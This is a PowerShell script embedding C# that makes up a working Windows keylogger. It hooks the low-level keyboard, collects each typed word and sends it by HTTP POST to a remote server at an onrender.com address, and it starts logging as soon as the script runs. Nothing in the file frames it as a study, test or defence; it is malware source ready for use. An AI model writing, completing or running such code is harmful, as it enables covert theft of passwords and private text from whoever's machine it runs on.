Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.Net;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    // To hold the current word being typed
    private static string currentWord = "";

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Main() {
      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static void SendWordToServer(string word) {
  try {
    // Prepare the request body with the 'words' key
    string jsonBody = "{ \"words\": \"" + word + "\" }";

    // Use WebRequest to send the POST request to the server
    string url = "https://me-7nk9.onrender.com/captures";
    var webRequest = System.Net.WebRequest.Create(url);
    webRequest.Method = "POST";
    byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
    webRequest.ContentType = "application/json";
    webRequest.ContentLength = byteArray.Length;

    using (Stream dataStream = webRequest.GetRequestStream()) {
      dataStream.Write(byteArray, 0, byteArray.Length);
    }

    var response = webRequest.GetResponse();
    response.Close();
  }
  catch (Exception ex) {
    Console.WriteLine("Error sending to server: " + ex.Message);
  }
}

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        Keys key = (Keys)vkCode;

        // Check if the pressed key is a space
        if (key == Keys.Space) {
          if (!string.IsNullOrEmpty(currentWord)) {
            // Send the current word to the server and reset the word buffer
            SendWordToServer(currentWord);
            currentWord = "";  // Reset for the next word
          }
        }
        else if (key == Keys.Back) {
          // If Backspace is pressed, remove the last character from the current word
          if (currentWord.Length > 0) {
            currentWord = currentWord.Substring(0, currentWord.Length - 1);
          }
        }
        else {
          // Add the character to the current word
          currentWord += key.ToString();
        }
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();
